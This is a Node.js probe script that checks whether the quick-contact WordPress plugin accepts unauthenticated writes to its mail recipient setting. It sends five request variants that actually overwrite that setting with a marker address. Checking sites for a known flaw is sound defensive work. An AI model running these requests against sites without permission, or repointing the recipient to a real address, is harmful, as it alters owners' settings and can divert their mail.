// probe.mjs - verifies CVE-2026-90001 (quick-contact <= 1.0.0):
// unauthenticated write to the qc_recipient option via the qc_save_settings AJAX action.
//
// Usage: node probe.mjs <base-url>
// Exit codes:
//   0 = VULNERABLE (an unauthenticated request was accepted and the handler reported success)
//   1 = NOT VULNERABLE (every variant was rejected, redirected, or failed)
//   2 = INCONCLUSIVE (bad usage, or no variant produced an HTTP response from the target)
//
// Only requests to <base-url> are sent. Redirects are not followed.
// Limitation: the plugin exposes no public read path for qc_recipient, so success is judged
// from the handler's response (HTTP 200 + JSON success:true). The original option value cannot
// be read back, so it cannot be restored; the probe only writes a unique marker address.

import crypto from 'node:crypto';

const baseArg = process.argv[2];
if (!baseArg) {
  console.error('usage: node probe.mjs <base-url>');
  process.exit(2);
}

let base;
try {
  base = new URL(baseArg);
  if (base.protocol !== 'http:' && base.protocol !== 'https:') throw new Error('bad protocol');
} catch {
  console.error(`invalid base URL: ${baseArg}`);
  process.exit(2);
}

// Keep the base path (in case WordPress lives in a subdirectory) but stay on the same origin.
const root = base.href.endsWith('/') ? base.href : base.href + '/';
const AJAX = new URL('wp-admin/admin-ajax.php', root);
const TOKEN = crypto.randomBytes(6).toString('hex');
const MARKER = `qc-${TOKEN}@mail.invalid`;

// Each variant is an attack shape for this bug class (unauthenticated state change via
// admin-ajax). A fix must reject all of them to count as fixed.
function variants() {
  return [
    {
      name: 'POST urlencoded, action + recipient in body',
      url: AJAX,
      init: {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ action: 'qc_save_settings', recipient: MARKER }).toString(),
      },
    },
    {
      name: 'GET query string, action + recipient in URL',
      url: withQuery(AJAX, { action: 'qc_save_settings', recipient: MARKER }),
      init: { method: 'GET' },
    },
    {
      name: 'POST multipart/form-data',
      url: AJAX,
      init: {
        method: 'POST',
        body: (() => {
          const fd = new FormData();
          fd.append('action', 'qc_save_settings');
          fd.append('recipient', `  QC.${TOKEN}+Notify@Mail.Invalid  `);
          return fd;
        })(),
      },
    },
    {
      name: 'Split sources: action in POST body, recipient in URL query',
      url: withQuery(AJAX, { recipient: `QC.${TOKEN}%2Bsplit@mail.invalid` }),
      init: {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ action: 'qc_save_settings' }).toString(),
      },
    },
    {
      name: 'GET with percent-encoded recipient and action',
      url: new URL(
        `wp-admin/admin-ajax.php?action=qc_save_settings&recipient=${encodeURIComponent(MARKER)}`,
        root,
      ),
      init: { method: 'GET' },
    },
  ];
}

function withQuery(url, params) {
  const u = new URL(url.href);
  for (const [k, v] of Object.entries(params)) {
    // Avoid double-encoding values that are already percent-encoded.
    if (v.includes('%')) u.search += (u.search ? '&' : '?') + `${encodeURIComponent(k)}=${v}`;
    else u.searchParams.append(k, v);
  }
  return u;
}

async function runVariant(v) {
  try {
    const res = await fetch(v.url, {
      ...v.init,
      redirect: 'manual',
      signal: AbortSignal.timeout(10000),
    });
    const text = await res.text();
    let success = false;
    try {
      success = res.status === 200 && JSON.parse(text).success === true;
    } catch {
      success = false;
    }
    return { name: v.name, status: res.status, body: text.slice(0, 120), vulnerable: success, error: null };
  } catch (err) {
    return { name: v.name, status: null, body: '', vulnerable: false, error: String(err && err.message) };
  }
}

let responded = 0;
for (const v of variants()) {
  const r = await runVariant(v);
  if (r.error) {
    console.log(`[error] ${r.name}: ${r.error}`);
    continue;
  }
  responded++;
  console.log(`[${r.vulnerable ? 'ACCEPTED' : 'rejected'}] ${r.name} -> HTTP ${r.status} ${JSON.stringify(r.body)}`);
  if (r.vulnerable) {
    console.log(`VULNERABLE: unauthenticated qc_save_settings accepted (marker ${MARKER}).`);
    process.exit(0);
  }
}

if (responded === 0) {
  console.log('INCONCLUSIVE: no variant produced an HTTP response from the target.');
  process.exit(2);
}
console.log('NOT VULNERABLE: all variants were rejected.');
process.exit(1);
